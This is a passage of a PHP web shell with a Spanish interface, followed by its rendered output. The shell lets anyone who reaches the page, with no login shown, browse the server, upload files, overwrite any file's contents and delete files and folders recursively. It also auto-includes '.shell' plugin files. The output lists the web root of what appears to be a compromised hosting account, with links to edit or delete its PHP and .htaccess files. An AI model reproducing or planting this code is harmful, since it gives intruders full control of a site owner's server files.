        select,option{height:25px;padding:-2px;border:solid 1px #369;}
        option{border:solid 1px #eee;}
        #menu,#pie,#ext_menu{width:100%;border-bottom:solid 1px #369;background:url(http://<?php echo $script;?>?imagen::fondo2) repeat-x;height:14px;padding:8px 0;text-align:center;}
        #menu a:link,#menu a:visited,#menu a:active,#pie a:link,#pie a:visited,#pie a:active,#pie span,#ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{text-decoration:none;font-weight:bold;color:#369;padding:3px 10px 3px 28px;background-position:2px 2px;}
        #menu a:hover,#pie a:hover,#ext a:hover{padding:1px 9px 1px 27px;border:solid 1px #ddd;background-position:1px 0px;color:#333;}
        #ext_menu a:link,#ext_menu a:visited,#ext_menu a:active,#ext_menu span{padding:3px 28px 3px 28px;}
        #ext_menu a:hover{padding:1px 27px 1px 27px;border:solid 1px #c90;}
        #pie{border-top:solid 1px #369;}
        #pie input{background:url(http://<?php echo $script;?>?imagen::nombre) 4px 2px no-repeat;padding-left:24px;border:solid 1px #ddd;margin:-4px 10px;width:200px;color:#369;font-weight:bold;}
        #ext_menu{background:url(http://<?php echo $script;?>?imagen::fondo3) repeat-x;}
        #menu_logo,#pie_logo{background:url(http://<?php echo $script;?>?imagen::plugin2) 0px 10px no-repeat;float:left;width:48px;height:40px;display:block;z-index:999;margin-top:-18px;}
        #pie_logo{background:url(http://<?php echo $script;?>?imagen::servidor2) 4px 10px no-repeat;margin-bottom:-18px;overflow:hidden;display:fixed;z-index:999;}
        #guardar{background:url(http://<?php echo $script;?>?imagen::guardar) left no-repeat;}
        #resetear{background:url(http://<?php echo $script;?>?imagen::resetear) left no-repeat;}
        a#inicio{background:url(http://<?php echo $script;?>?imagen::inicio) left no-repeat;}
        a#subir_archivo{background:url(http://<?php echo $script;?>?imagen::subir) left no-repeat;}
        a#crear_carpeta{background:url(http://<?php echo $script;?>?imagen::carpeta) left no-repeat;}
        a#crear_archivo{background:url(http://<?php echo $script;?>?imagen::archivo) left no-repeat;}
        a#borrar{background:url(http://<?php echo $script;?>?imagen::error) left no-repeat;}
        a#descargar{background:url(http://<?php echo $script;?>?imagen::bajar) left no-repeat;}
        a#editar{background:url(http://<?php echo $script;?>?imagen::editar) left no-repeat;}
        a#mysql{background:url(http://<?php echo $script;?>?imagen::mysql) left no-repeat;}
        a#info{background:url(http://<?php echo $script;?>?imagen::info) left no-repeat;}
        a#servidor{background:url(http://<?php echo $script;?>?imagen::servidor) left no-repeat;}
        a#extensiones{background:url(http://<?php echo $script;?>?imagen::plugin) left no-repeat;}
        span#carga{background:url(http://<?php echo $script;?>?imagen::engranaje) left no-repeat;}
        table{margin:0;padding:0;width:100%;border-bottom:solid 1px #369;background:white;border-collapse: collapse;}
        table td{border:solid 1px #eee;color:#555;padding:2px 4px 2px 10px;}
        table tr:hover{background:#eee;}
        textarea{border:none;width:100%;height:500px;overflow:auto;}
        form span {color:#444;font-weight:bold;}
        .opciones{width:350px;}
        .ext_opciones{width:250px;}
        .opciones a:link,.opciones a:visited,.opciones a:active, .ext_opciones a:link,.ext_opciones a:visited,.ext_opciones a:active{padding:2px 18px;text-decoration:none;font-weight:bold;color:#369;background-position:2px 2px;font-size:10px;}
        .opciones a:hover, .ext_opciones a:hover{padding:-5px 9px;background-position:1px 1px;color:#black;}
        .primer_fila{padding-left:10px;font-weight:bold;color:#369;border:solid 1px #369;background:lightblue;}
        .permisos{color:#aaa;}
        .si_permisos{color:green;}
        .no_permisos{color:red;}
        .archivo{background:url(http://<?php echo $script;?>?imagen::archivo) center no-repeat;width:18px;height:18px;}
        .carpeta{background:url(http://<?php echo $script;?>?imagen::carpeta) center no-repeat;width:18px;height:18px;}
        .enlace{background:url(http://<?php echo $script;?>?imagen::enlace) center no-repeat;width:18px;height:18px;}
        .extension{background:url(http://<?php echo $script;?>?imagen::plugin) center no-repeat;width:18px;height:18px;}
        .contenedor,.error,.exito{width:100%;border-bottom:solid 1px #369;background:white;padding:5px 10px;text-align:center;}
        .error{background:#f66;color:white;font-weight:bold;}
        .exito{background:#0c9;color:white;font-weight:bold;}
    </style>
</head>

<body>
<?php

function verificar($x){if(strtolower(@ini_get($x)) or @ini_get($x)=='on'){return true;}else{return false;}}
function tamaño($tam){if(!is_numeric($tam)){return FALSE;}else{if($tam>=1073741824){$tam=round($tam/1073741824*100)/100 .' GB';}elseif($tam>=1048576){$tam=round($tam/1048576*100)/100 .' MB';}elseif($tam>=1024){$tam=round($tam/1024*100)/100 .' KB';}else{$tam=$tam.' B';}return $tam;}}
function ruta(){$dir=$_GET['d'];if(trim($dir)==''){$dir=getcwd();}elseif(!trim($dir)==''){$dir=@realpath($dir);}if(substr($dir,-1)!=DIRECTORY_SEPARATOR){$dir.= DIRECTORY_SEPARATOR;}$pd=$e=explode(DIRECTORY_SEPARATOR,substr($dir,0,-1));$i=0;foreach($pd as $b){$t='';$j=0;foreach($e as $r){$t.=$r.DIRECTORY_SEPARATOR;if($j==$i){break;}$j++;}echo'<a href="?dir&'.urlencode($t).'">'.htmlspecialchars($b).DIRECTORY_SEPARATOR.'</a>';$i++;}}
function ver_permisos($modo){if(!empty($modo)){switch ($modo){case 0xC000:$tipo='s';break;case 0x4000:$tipo='d';break;case 0xA000:$tipo='l';break;case 0xC000:$tipo='-';break;case 0xC000:$tipo='b';break;case 0xC000:$tipo='c';break;case 0xC000:$tipo='p';break;}}$propio['lectura']=($modo & 00400)?'r':'-';$propio['escritura']=($modo & 00200)?'w':'-';$propio['ejecucion']=($modo & 00100)?'x':'-';$grupo['lectura']=($modo & 00040)?'r':'-';$grupo['escritura']=($modo & 00020)?'w':'-';$grupo['ejecucion']=($modo & 00010)?'x':'-';$mundo['lectura']=($modo & 00004)?'r':'-';$mundo['escritura']=($modo & 00002)? 'w':'-';$mundo['ejecucion']=($modo & 00001)?'x':'-';return $tipo.join($propio).join($grupo).join($mundo);}
function color_permisos($file_color){if(!is_readable($file_color)){return'<span class="no_permisos">'.ver_permisos(fileperms($file_color)).'</span>';}elseif(!is_writable($file_color)){return'<span class="permisos">'.ver_permisos(fileperms($file_color)).'</span>';}else{return'<span class="si_permisos">'.ver_permisos(fileperms($file_color)).'</span>';}}

function menu(){
    global $homedir;
    global $dir;
    echo '<div id="menu">
    <a id="inicio" href="http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'">Inicio</a>
    <a id="subir_archivo" href="?subir::'.$dir.'">Subir archivo</a>
    <a id="crear_carpeta" href="?crear_carpeta::'.@realpath($dir.'/').'">Crear carpeta</a>
    <a id="extensiones" href="?extensiones::inicio">Extensiones</a>
    <a id="info" href="?codigo"></a>
    </div>';
}

function pie(){
    global $menu_crear;
    global $menu_guardar;
    global $homedir;
    global $dir;
    echo '<div id="pie">
    <div id="pie_logo"></div>';
    if($menu_crear==true){echo'<input type="text" name="nombre" />';}
    if($menu_guardar==true or $menu_crear==true){echo'<a id="guardar" href="javascript:{}" onclick="document.getElementById(\'editor\').submit(); return false;">Guardar cambios</a>
    <a id="resetear" href="javascript:{}" onclick="document.getElementById(\'editor\').reset(); return false;">Restaurar</a>
    </form>';}
    $t2=round(microtime(),3);$tiempo = $t2 - $t1;
    echo'<a id="servidor" href="http://'.gethostbyname($_SERVER["REMOTE_ADDR"]).'/">Tu IP: '.gethostbyname($_SERVER["REMOTE_ADDR"]).'</a>
    <a id="servidor" href="http://'.gethostbyname($_SERVER["HTTP_HOST"]).'/">IP del servidor: '.gethostbyname($_SERVER["HTTP_HOST"]).'</a>
    <span id="carga" href="#">'.$tiempo.' seg</span>
    </div>';
}

function info(){
    $contenido=@file_get_contents($web.'info/');
    echo $contenido;
}

function listar_archivos($dir){
    global $drive;
    if ($dh=@dir($dir)){
        while ($file = $dh->read()){
            if (($file=='.') or ($file=='..')){
                $links_ls[]=$file;
            }elseif (is_dir($dir.'/'.$file)){
                $dirs_ls[]=$file;
            }else{
                $archivos_ls[]=$file;
            }
        }
        echo '<table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr>';
        if($links_ls){
            foreach ($links_ls as $links){
                if ($links=='..'){
                    echo '<tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::'.@realpath($dir.'/..').'">'.$links.'</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td>'.color_permisos(@realpath($dir.'/..')).'</td>
                        <td></td>
                    </tr>';
                }elseif ($links=='.'){
                    echo '<tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::'.@realpath($drive).'">'.$links.'</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td>'.color_permisos(@realpath($drive)).'</td>
                        <td></td>
                        </tr>';
                }
            }
        }    
        if(@asort($dirs_ls)){        
            foreach ($dirs_ls as $dirs){
                echo '<tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::'.@realpath($dir.'/'.$dirs).'">'.$dirs.'</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td>'.color_permisos(@realpath($dir.'/'.$dirs)).'</td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::'.@realpath($dir.'/'.$dirs).'::'.@realpath($dir.'/').'::1">Borrar</a></td>
                    </tr>';
                    flush();
                    ob_flush();
            }
        }
        if(@asort($archivos_ls)){
            foreach ($archivos_ls as $archivo){
                echo '<tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::'.@realpath($dir.'/').'::'.$archivo.'">'.$archivo.'</a></td>
                    <td>Archivo</td>
                    <td>'.tamaño(filesize(@realpath($dir.'/'.$archivo))).'</td>
                    <td>'.color_permisos(@realpath($dir.'/'.$archivo)).'</td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::'.@realpath($dir.'/'.$archivo).'::'.@realpath($dir.'/').'::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::'.@realpath($dir.'/'.$archivo).'::'.$archivo.'::'.@realpath($dir.'/').'">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::'.@realpath($dir.'/').'::'.$archivo.'">Editar</a>
                    </td>
                    </tr>';
                flush();
                ob_flush();
            }
        }
        echo '</table>';
    }else{
        echo '<div class="error">La carpeta no existe o no se tienen permisos para acceder a ella.</div>';
    }
}
    
function subir_archivo($dir){
    if (is_writable($dir)){
        echo '<div class="contenedor">
        <form method="post" enctype="multipart/form-data">
        <span>Subir un archivo a "'.$dir.'":</span><br/><br/>
        <input type="hidden" name="subir_archivo" value="true" />
        <input type="hidden" name="dir" value="'.base64_encode($dir).'" />
        <input type="file" name="archivo" /><br/><br/>
        <input type="submit" value="Subir archivo" />
        </form>
        </div>
        ';
    }else{
        echo '<div class="error">La carpeta no posee permisos de escritura.</div>';
    }
}

function crear_carpeta($dir){
    if ($_POST['crear_carpeta']!='true') {
        $dir=urldecode($dir);
        if (is_writable($dir)){
            echo '<div class="contenedor">
            <form method="post">
            <span>Crear carpeta en "'.$dir.'":</span><br/><br/>
            <input type="hidden" name="crear_carpeta" value="true" />
            <input type="hidden" name="dir" value="'.$dir.'" />
            <input type="text" name="carpeta" /><br/><br/>
            <input type="submit" value="Crear carpeta" />
            </form>
            </div>
            ';
        }else{
            echo '<div class="error">La carpeta no posee permisos de escritura.</div>';
            listar_archivos($dir);
        }
    }
}

function borrar_archivo($archivo,$dir){
    $archivo=urldecode($archivo);
    if(@unlink($archivo)){
        echo '<div class="exito">El archivo '.$archivo.' fue borrado con éxito.</div>';
        listar_archivos($dir);
    }else{
        echo '<div class="error">Error al borrar el archivo '.$archivo.'</div>';
    }
}

function borrar_carpeta($carpeta,$dir,$salida){
    $carpeta=urldecode($carpeta).'\\';
    $h=@opendir(($carpeta));
    while(($p=@readdir($h))!==FALSE){
        if(($p!= '.')and($p!='..')){
            if (!is_dir($carpeta.$p)){
                unlink($carpeta.$p);
            }else{
                borrar_carpeta($carpeta.$p.DIRECTORY_SEPARATOR,$dir,0);
                @rmdir($carpeta.$p);
            }
        }
    }
    @closedir($h);
    @rmdir($carpeta);
    if($salida==1){
        if(!is_dir($carpeta)){
            echo '<div class="exito">La carpeta '.$carpeta.' fue borrada con éxito.</div>';
        }else{
            echo '<div class="error">Error al borrar la carpeta '.$carpeta.'.</div>';
        }
    listar_archivos($dir);
    }
}

function editar($carpeta,$archivo)    {
     echo '<form method="post" id="editor">
    <input type="hidden" name="guardar_archivo" value="true" />
    <input type="hidden" name="nombre" value="'.$archivo.'" />
    <input type="hidden" name="carpeta" value="'.$carpeta.'" />
    <textarea name="codigo">';
     $contenido=@file_get_contents($carpeta.'/'.$archivo);
     echo stripslashes(htmlspecialchars($contenido));
     echo '</textarea>';
}

function ext_inicio(){
// @file_get_contents($web.'listado/');
$listado=file_get_contents('listado.php');
echo $listado;
}

function extensiones($accion) {
    switch($accion){
        case'inicio':ext_inicio();break;
        default:ext_inicio();break;
    }
}

menu();

function include_extensiones(){
    global $query;
    global $ext_disponibles;
    global $dir;
    if ($asd=@dir(getcwd())){
        while ($item = $asd->read()){
            if (preg_match('/\.(shell|SHELL)$/',$item)){
                $ext_disponibles[]= $item;
            }
        }
        echo '<div id="ext_menu">
            <div id="menu_logo"></div>';
        if(!empty($ext_disponibles)){
            foreach($ext_disponibles as $ext) {
                $ext=substr($ext,0,strlen($ext)-6);
                echo '<a href="?extension::'.$ext.'">'.str_replace('_',' ',$ext).'</a>';
            }
        }else{
            echo'<span> No hay ninguna extensión instalada aún.</span>';
        }
        echo '</div>';
        foreach($ext_disponibles as $ext) {
            include($ext);
        }
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

include_extensiones();

if($_POST['subir_archivo']=='true' and !empty($_FILES['archivo'])){
     global $_FILES;
     $archivo = $_FILES["archivo"];
     $dir = htmlspecialchars(base64_decode($_POST['dir']));
     if (!empty($archivo["tmp_name"])){
        if (empty($nombre_archivo)){
            $destino = $archivo["name"];
        }else{
            $destino = $userfilename;
        }
        if (!move_uploaded_file($archivo["tmp_name"],$dir.'/'.$destino)){
            echo'<div class="error">Error al subir el archivo "'.$archivo["name"].'" a '.$dir.'.</div>';
        }else{
            echo'<div class="exito">El archivo "'.$archivo["name"].'" se subió exitosamente a '.$dir.'.</div>';
            listar_archivos($dir);
        }
    }
}
if ($_POST['guardar_archivo'] == 'true' and !empty($_POST['carpeta']) and !empty($_POST['nombre']) and !empty($_POST['codigo'])){
    $ruta=stripslashes($_POST['carpeta']).urldecode(stripslashes($_POST['nombre']));
    $f = fopen($ruta, 'w+');
    fwrite($f, $_POST['codigo']);
    fclose($f);
    if(file_exists($ruta)){
        echo '<div class="exito">Se guardo exitosamente "'.stripslashes($_POST['nombre']).'" en "'.stripslashes($_POST['carpeta']).'".</div>';
    }else{
        echo '<div class="error">Error al guardar "'.stripslashes($_POST['nombre']).'" en "'.stripslashes($_POST['carpeta']).'".</div>';
    }
    //editar(urldecode(stripslashes($_POST['carpeta'])),urldecode(stripslashes($_POST['nombre'])));
}
if ($_POST['crear_carpeta'] == 'true' and !empty($_POST['carpeta'])){
    $carp=@mkdir($dir.'/'.trim($_POST['carpeta']));
    if($carp){
         echo '<div class="exito">La carpeta "'.$_POST['carpeta'].'" se ha creado con exito en '.stripslashes(urldecode($_POST['dir'])).'</div>';
    }else{
        echo'<div class="error">Error al crear carpeta "'.$$_POST['name'].'" en '.$dir.'.</div>';
    }
    listar_archivos($dir);
}
switch($query[0]){
    //case'info':info();break;
    case'dir':listar_archivos($query[1]);break;
    case'subir':subir_archivo($query[1]);break;
    case'borrar_archivo':borrar_archivo($query[1],$query[2]);break;
    case'borrar_carpeta':borrar_carpeta($query[1],$query[2],$query[3]);break;
    case'editar':editar($query[1],$query[2]);break;
    case'crear_archivo':crear_archivo($query[1]);break;
    case'crear_carpeta':crear_carpeta($query[1]);break;
    case'extensiones':extensiones($query[1]);break;
    default:listar_archivos($homedir);break;
}    
pie();
?> <table>
            <tr class="primer_fila">
                <td></td>
                <td>Nombre</td>
                <td>Tipo</td>
                <td>Tamaño</td>
                <td>Permisos</td>
                <td class="opciones">Opciones</td>
            </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">..</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                    </tr><tr valign="top">
                        <td class="enlace"></td>
                        <td><a href="?dir::">.</a></td>
                        <td>Enlace</td>
                        <td></td>
                        <td><span class="no_permisos">---------</span></td>
                        <td></td>
                        </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin">admin</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/admin::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades">comunidades</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comunidades::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta">cuenta</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cuenta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images">images</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/images::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes">includes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/includes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab">lab</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/lab::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes">mensajes</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mensajes::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones">notificaciones</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha">recaptcha</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss">rss</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/rss::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search">search</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/search::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="carpeta"></td>
                    <td><a href="?dir::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads">socialads</a></td>
                    <td>Carpeta</td>
                    <td></td>
                    <td><span class="si_permisos">rwxr-x--x</span></td>
                    <td class="opciones"><a id="borrar" href="?borrar_carpeta::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/socialads::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a></td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">.htaccess</a></td>
                    <td>Archivo</td>
                    <td>3.81 KB</td>
                    <td><span class="si_permisos">rw-r--r--</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/.htaccess::.htaccess::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::.htaccess">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">404.php</a></td>
                    <td>Archivo</td>
                    <td>7.71 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/404.php::404.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::404.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">agregar.form.php</a></td>
                    <td>Archivo</td>
                    <td>12.8 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
